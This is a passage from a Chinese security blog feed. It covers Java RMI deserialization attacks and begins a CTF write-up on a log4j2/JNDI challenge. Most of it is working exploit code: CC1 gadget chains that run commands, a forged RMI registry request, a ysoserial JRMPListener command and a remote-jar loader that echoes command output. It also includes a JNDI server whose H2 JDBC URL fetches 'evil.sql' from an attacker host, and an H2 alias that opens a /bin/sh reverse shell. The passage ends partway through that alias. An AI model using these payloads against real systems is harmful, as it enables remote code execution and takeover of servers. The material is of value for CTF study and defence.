</span><br><span class="line">        // 2. 生成恶意 Payload (CC1 链包装在 InvocationHandler 中)  </span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) CC1();  </span><br><span class="line">  </span><br><span class="line">        // 3. 将 Payload 包装成 Remote 代理对象  </span><br><span class="line">        // 因为 bind 方法要求第二个参数必须是 Remote 类型  </span><br><span class="line">        Remote remotePayload = (Remote) Proxy.newProxyInstance(  </span><br><span class="line">                Remote.class.getClassLoader(),  </span><br><span class="line">                new Class[]&#123;Remote.class&#125;,  </span><br><span class="line">                invocationHandler  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        // 4. 获取 registry 代理中的 UnicastRef 对象  </span><br><span class="line">        // 动态代理的 Handler 是 RemoteObjectInvocationHandler，它的父类 RemoteObject 中有 ref 字段  </span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();  </span><br><span class="line">        fields_0[0].setAccessible(true);  </span><br><span class="line">        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);  </span><br><span class="line">  </span><br><span class="line">        // 5. 伪造 RMI 请求 (利用 lookup 方法)  </span><br><span class="line">        // newCall(RemoteObject obj, Operation[] operations, int opnum, long interfaceHash)        // 0: bind, 1: list, 2: lookup, 3: rebind, 4: unbind        // 传入 null 作为 operations，因为我们直接指定了 opnum 和 hash        RemoteCall var2 = ref.newCall((RemoteObject) registry, null, 2, 4905912898345647071L);  </span><br><span class="line">  </span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();  </span><br><span class="line">  </span><br><span class="line">        // bind(String name, Remote obj)  </span><br><span class="line">        //lookup(Remote obj)        // 必须按照服务端参数顺序写入：先写名字，再写恶意对象  </span><br><span class="line">        var3.writeObject(remotePayload);  </span><br><span class="line">  </span><br><span class="line">        // 6. 发送请求  </span><br><span class="line">        // 这一步会触发服务端的反序列化  </span><br><span class="line">        try &#123;  </span><br><span class="line">            ref.invoke(var2);  </span><br><span class="line">        &#125; catch (Exception e) &#123;  </span><br><span class="line">            // 服务端反序列化成功后通常会抛出异常，因为本地的逻辑并不完整，但这代表攻击已经发送  </span><br><span class="line">            System.out.println(&quot;Payload sent. Check the server.&quot;);  </span><br><span class="line">            // e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static Object CC1() throws Exception &#123;  </span><br><span class="line">        // 标准 CC1 TransformedMap 链  </span><br><span class="line">        Transformer[] t = new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedtransformer = new ChainedTransformer(t);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;); // Key 必须是 &quot;value&quot;，因为 Target 注解中有 value() 方法  </span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);  </span><br><span class="line">  </span><br><span class="line">        // 获取 AnnotationInvocationHandler 的构造器  </span><br><span class="line">        Class&lt;?&gt; cc = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        declaredConstructor.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">        // 实例化 Handler        Object o = declaredConstructor.newInstance(Target.class, decorate);  </span><br><span class="line">  </span><br><span class="line">        return o;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/67304d02/20251231154459743.png" alt="image.png"></p>
<h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><h3 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h3><p>那么还是离不开刚刚分析的那几个方法</p>
<ul>
<li>bind</li>
<li>unbind</li>
<li>rebind</li>
<li>list</li>
<li>lookup<br>在这其中unbind和rebind都会返回数据给客户端,返回的形式是序列化的形式,那么客户端就只能使用反序列化来获取,如果我们能控制返回的数据这样就可以进行攻击了.这里使用的是ysoserial的JRMPListener,命令如下:<br><code>java -cp .\ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 calc</code><br>不用加单引号<br><img src="/posts/67304d02/20251231155929605.png" alt="image.png"></li>
</ul>
<h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p>服务端攻击客户端可以利用的点分为两种:</p>
<ol>
<li>服务端返回对象</li>
<li>远程加载对象</li>
</ol>
<h4 id="服务端返回对象"><a href="#服务端返回对象" class="headerlink" title="服务端返回对象"></a>服务端返回对象</h4><p>在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以CC1为例：<br>User接口:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;  </span><br><span class="line">  </span><br><span class="line">public interface User extends Remote &#123;  </span><br><span class="line">    public Object getUser() throws Exception;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接口实现类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.InvocationTargetException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class RemoteOBJ extends UnicastRemoteObject implements User&#123;  </span><br><span class="line">    public RemoteOBJ() throws RemoteException &#123;  </span><br><span class="line">        //UnicastRemoteObject.exportObject(this,0);如果不继承UnicastRemoteObject就需要手动导出  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    public Object getUser() throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;  </span><br><span class="line">        Transformer[] t = new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedtransformer = new ChainedTransformer(t);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;); // Key 必须是 &quot;value&quot;，因为 Target 注解中有 value() 方法  </span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);  </span><br><span class="line">  </span><br><span class="line">        // 获取 AnnotationInvocationHandler 的构造器  </span><br><span class="line">        Class&lt;?&gt; cc = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        declaredConstructor.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">        // 实例化 Handler        Object o = declaredConstructor.newInstance(Target.class, decorate);  </span><br><span class="line">  </span><br><span class="line">        return o;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>绑定到服务端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line">public class RMIclient &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);  </span><br><span class="line">        User rmiserver = (User)registry.lookup(&quot;rmiserver&quot;);  </span><br><span class="line">        rmiserver.getUser();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端的调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line">public class RMIclient &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);  </span><br><span class="line">        User rmiserver = (User)registry.lookup(&quot;rmiserver&quot;);  </span><br><span class="line">        rmiserver.getUser();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/67304d02/20251231161637254.png" alt="image.png"></p>
<h4 id="加载远程对象"><a href="#加载远程对象" class="headerlink" title="加载远程对象"></a>加载远程对象</h4><p>大家可以找p神的文章看一下,具体实现的条件有点苛刻,我就没细看</p>
<h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="客户端打服务端"><a href="#客户端打服务端" class="headerlink" title="客户端打服务端"></a>客户端打服务端</h3><p>服务端实现类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.InvocationTargetException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class RemoteOBJ extends UnicastRemoteObject implements User&#123;  </span><br><span class="line">    public RemoteOBJ() throws RemoteException &#123;  </span><br><span class="line">        //UnicastRemoteObject.exportObject(this,0);如果不继承UnicastRemoteObject就需要手动导出  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    public void getUser(Object o) throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;  </span><br><span class="line">        System.out.println(&quot;getUser&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class RMIclient &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);  </span><br><span class="line">        User rmiserver = (User)registry.lookup(&quot;rmiserver&quot;);  </span><br><span class="line">        rmiserver.getUser(payload());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static Object payload() throws Exception &#123;  </span><br><span class="line">        Transformer[] t = new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedtransformer = new ChainedTransformer(t);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;); // Key 必须是 &quot;value&quot;，因为 Target 注解中有 value() 方法  </span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);  </span><br><span class="line">  </span><br><span class="line">        // 获取 AnnotationInvocationHandler 的构造器  </span><br><span class="line">        Class&lt;?&gt; cc = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        declaredConstructor.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">        // 实例化 Handler        Object o = declaredConstructor.newInstance(Target.class, decorate);  </span><br><span class="line">  </span><br><span class="line">        return o;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>记得改接口,就是利用传的参数是一个恶意类<br><img src="/posts/67304d02/20251231163059954.png" alt="image.png"></p>
<h3 id="加载远程对象-1"><a href="#加载远程对象-1" class="headerlink" title="加载远程对象"></a>加载远程对象</h3><p>和上述一样.<a href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p>
<h1 id="RMI的进阶攻击方式"><a href="#RMI的进阶攻击方式" class="headerlink" title="RMI的进阶攻击方式"></a>RMI的进阶攻击方式</h1><p>攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端,这样也就得到了命令执行的回显<br>远程demo：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"> </span><br><span class="line">public class ErrorBaseExec &#123;</span><br><span class="line"> </span><br><span class="line">    public static void do_exec(String args) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        Process proc = Runtime.getRuntime().exec(args);</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));</span><br><span class="line">        StringBuffer sb = new StringBuffer();</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = br.readLine()) != null)</span><br><span class="line">        &#123;</span><br><span class="line">            sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        String result = sb.toString();</span><br><span class="line">        Exception e=new Exception(result);</span><br><span class="line">        throw e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>制作jar包的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac ErrorBaseExec.java</span><br><span class="line">jar -cvf RMIexploit.jar ErrorBaseExec.class</span><br></pre></td></tr></table></figure>
<p>客户端的poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"> </span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"> </span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">public class Client &#123;</span><br><span class="line">    public static Constructor&lt;?&gt; getFirstCtor(final String name)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        final Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0];</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line"> </span><br><span class="line">        return ctor;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String ip = &quot;127.0.0.1&quot;; //注册中心ip</span><br><span class="line">        int port = 1099; //注册中心端口</span><br><span class="line">        String remotejar = 远程jar;</span><br><span class="line">        String command = &quot;whoami&quot;;</span><br><span class="line">        final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            final Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(java.net.URLClassLoader.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                            new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                            new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;newInstance&quot;,</span><br><span class="line">                            new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                            new Object[] &#123;</span><br><span class="line">                                    new Object[] &#123;</span><br><span class="line">                                            new java.net.URL[] &#123; new java.net.URL(remotejar) &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                            &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;loadClass&quot;,</span><br><span class="line">                            new Class[] &#123; String.class &#125;,</span><br><span class="line">                            new Object[] &#123; &quot;ErrorBaseExec&quot; &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                            new Class[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                            new Object[] &#123; &quot;do_exec&quot;, new Class[] &#123; String.class &#125; &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                            new Class[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                            new Object[] &#123; null, new String[] &#123; command &#125; &#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"> </span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformedChain);</span><br><span class="line">            Class cl = Class.forName(</span><br><span class="line">                    &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(true);</span><br><span class="line"> </span><br><span class="line">            Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(ip, port);</span><br><span class="line">            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)</span><br><span class="line">                    .newInstance(Target.class,</span><br><span class="line">                            outerMap);</span><br><span class="line">            Remote r = Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                    Remote.class.getClassLoader(),</span><br><span class="line">                    new Class[] &#123; Remote.class &#125;, h));</span><br><span class="line">            registry.bind(&quot;liming&quot;, r);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                System.out.print(e.getCause().getCause().getCause().getMessage());</span><br><span class="line">            &#125; catch (Exception ee) &#123;</span><br><span class="line">                throw e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译的java环境要一样哈<br><img src="/posts/67304d02/20251231165538984.png" alt="image.png"></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>RMI就到此结束了</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>RMI</category>
      </categories>
  </entry>
  <entry>
    <title>Springctf-1zLog</title>
    <url>/posts/32c2684d/</url>
    <content><![CDATA[<h1 id="Springctf-1zLog"><a href="#Springctf-1zLog" class="headerlink" title="Springctf 1zLog"></a>Springctf 1zLog</h1><p>题目名称是1zlog，大概率是和log4j2有关，关于log4j2，它是java日志记录框架，漏洞的主要成因就是log4j2会将${}里的内容单独处理，也就是去调用lookup进行查找，这时就会产生jndi注入。<br>先把jar包放到jadx或者jd-gui里，反编译一下，进行代码审计。<br><img src="/posts/32c2684d/20260128014929629.png" alt="image.png"><br>这里便是利用点。<br>既然是jndi注入又是高版本java17，我的第一想法是看看是不是用tomcat起的服务，这样的话，能不能用BeanFactory打一波<br><img src="/posts/32c2684d/20260128015903020.png" alt="image.png"><br>很显然不是<br>这时候我们需要去看一下依赖包有哪些，有哪些可以利用的东西。<br><img src="/posts/32c2684d/20260128015230560.png" alt="image.png"><br>有两个很可疑的依赖包。<br>主要利用就看这篇文章就好<br><a href="https://research.qianxin.com/archives/2414">JDBC Attack与高版本JDK下的JNDI Bypass – 奇安信技术研究院</a><br>主要就是利用BasicDataSourceFactory远程加载sql语句，执行命令。<br><img src="/posts/32c2684d/20260128020253811.png" alt="image.png"><br>然后我们就开始写exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line"><span class="keyword">import</span> java.sql.Ref;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIserve</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;  </span><br><span class="line">        <span class="comment">//强制设置RMI服务端暴露公网ip  </span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;ip&quot;</span>);  </span><br><span class="line">        <span class="comment">//创建注册中心  </span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//写引用  </span></span><br><span class="line">        <span class="comment">//利用的本地工厂是BasicDataSourceFactory  </span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,<span class="string">&quot;org.apache.commons.dbcp2.BasicDataSourceFactory&quot;</span>,<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//我们要加载的sql语句  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://ip:8888/evil.sql&quot;</span>;  </span><br><span class="line">        <span class="comment">//定义数据库的连接，从url中下载可以执行的脚本  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=RUNSCRIPT FROM &#x27;&quot;</span> + url + <span class="string">&quot;&#x27;&quot;</span>;  </span><br><span class="line">        <span class="comment">//填充 Reference 属性  </span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>, <span class="string">&quot;org.h2.Driver&quot;</span>));  </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>, JDBC_URL));  </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;root&quot;</span>));  </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;password&quot;</span>));  </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>, <span class="string">&quot;1&quot;</span>));  </span><br><span class="line">        <span class="comment">//实现remote接口  </span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//bind到注册中心  </span></span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>,referenceWrapper);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地执行，生成class文件放到，vps下。<br><img src="/posts/32c2684d/20260128024213547.png" alt="image.png"><br>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 清理旧别名</span><br><span class="line">DROP ALIAS IF EXISTS SHELL;</span><br><span class="line"></span><br><span class="line">-- 创建一个新的恶意函数，这次我们在 Java 内部实现反弹 Shell 逻辑</span><br><span class="line">CREATE ALIAS SHELL AS $$</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">@CODE</span><br><span class="line">String shell(String ip, int port) throws Exception &#123;</span><br><span class="line">    // 1. 启动 /bin/sh 进程 (因为没有 bash)</span><br><span class="line">    String[] cmd = &#123;&quot;/bin/sh&quot;&#125;;</span><br><span class="line">    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();</span><br><span class="line">    </span><br><span class="line">    // 2. 连接攻击者的监听端口</span><br><span class="line">    Socket s = new Socket(ip, port);</span><br><span class="line">    </span><br><span class="line">    // 3. 对接输入输出流 (实现管道)</span><br><span class="line">    InputStream pi = p.getInputStream(), si = s.getInputStream();</span><br><span class="line">    OutputStream po = p.getOutputStream(), so = s.getOutputStream();</span><br><span class="line">    </span><br><span class="line">    // 4. 循环转发数据</span><br><span class="line">    while(!s.isClosed()) &#123;</span><br><span class="line">        while(pi.available() &gt; 0) so.write(pi.read());</span><br><span class="line">        while(si.available() &gt; 0) po.write(si.read());</span><br><span class="line">        so.flush();</span><br><span class="line">        po.flush();</span><br><span class="line">        Thread.sleep(50);</span><br><span class="line">        try &#123;</span><br><span class="line">            p.exitValue();</span><br><span class="line">            break;</span><br><span class="line">        &#125; catch (Exception e) 